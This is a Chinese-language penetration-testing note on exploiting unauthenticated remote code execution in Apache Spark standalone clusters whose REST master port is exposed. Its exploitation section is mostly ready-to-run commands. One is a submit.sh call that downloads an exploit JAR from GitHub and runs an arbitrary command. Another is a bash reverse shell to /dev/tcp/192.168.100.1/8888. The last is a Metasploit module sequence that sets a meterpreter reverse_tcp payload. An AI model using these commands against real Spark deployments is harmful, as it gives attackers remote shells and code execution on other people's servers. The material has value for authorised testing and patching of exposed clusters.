---
title: "Spark 未授权RCE漏洞"
slug: nstgnb
date: 2021-01-19T16:28:52+08:00
source: yuque/penetration
---

Spark这套计算框架，有多种部署方式，可以部署到一台计算机，也可以是多台(cluster)。我们要去计算数据，就必须要有计算机帮我们计算，当然计算机越多(集群规模越大)，我们的计算力就越强。但有时候我们只想在本机做个试验或者小型的计算，因此直接部署在单机上也是可以的。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1611044949989-7dc24251-da6f-42be-9d8a-c499d21f1661.png)

# 漏洞利用
## 要求一
> Spark is running on Standalone Mode.
>

**standalone模式**

这种模式下，Spark会自己负责资源的管理调度。它将cluster中的机器分为master机器和worker机器，master通常就一个，可以简单的理解为那个后勤管家，worker就是负责干计算任务活的苦劳力。具体怎么配置可以参考Spark 



作者：geekpy

链接：[https://www.jianshu.com/p/aaac505908dd](https://www.jianshu.com/p/aaac505908dd)

来源：简书

著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。



## 要求二
> REST URL of Master is accessible.
>

```basic
/bin/spark-submit \
        --cluster cluster_name \
        --master spark://host:port \
        ...
```



# 利用方式
## EXP脚本
```basic
./submit.sh spark_rest_url spark_version jar_url commands

如

./submit.sh 172.0.0.1:4040 2.3.1 https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar  "whoami"
```

这是一个反弹shell的例子

```basic
./submit.sh 192.168.100.2:6066 2.3.1 https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar "bash -i >& /dev/tcp/192.168.100.1/8888 0>&1"
```

## MSF模块
```basic
msf5>use exploit/linux/http/spark_unauth_rce
msf5>set payload java/meterpreter/reverse_tcp
msf5>set rhost 192.168.100.2
msf5>set rport 6066
msf5>set lhost 192.168.100.1
msf5>set lport 4444
msf5>set srvhost 192.168.100.1
msf5>set srvport 8080
msf5>exploit 
```

# 背景知识
我们要部署Spark这套计算框架，有多种方式，可以部署到一台计算机，也可以是多台(cluster)。我们要去计算数据，就必须要有计算机帮我们计算，当然计算机越多(集群规模越大)，我们的计算力就越强。但有时候我们只想在本机做个试验或者小型的计算，因此直接部署在单机上也是可以的。

<font style="color:#404040;">我们在初始化SparkConf时，或者提交Spark任务时，都会有这个</font>`<font style="color:#404040;">master</font>`<font style="color:#404040;">参数要设置</font>



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1611044949989-7dc24251-da6f-42be-9d8a-c499d21f1661.png)



# refs
+ [Spark启动时的master参数以及Spark的部署方式](https://www.jianshu.com/p/aaac505908dd)
+ [CVE-2020-9480: Apache Spark RCE vulnerability in auth-enabled standalone master](https://seclists.org/oss-sec/2020/q2/205)
+ [https://github.com/aRe00t/rce-over-spark](https://github.com/aRe00t/rce-over-spark)[](https://www.cnblogs.com/KevinGeorge/p/10399844.html)
+ [spark未授权RCE漏洞学习](https://www.cnblogs.com/KevinGeorge/p/10399844.html)

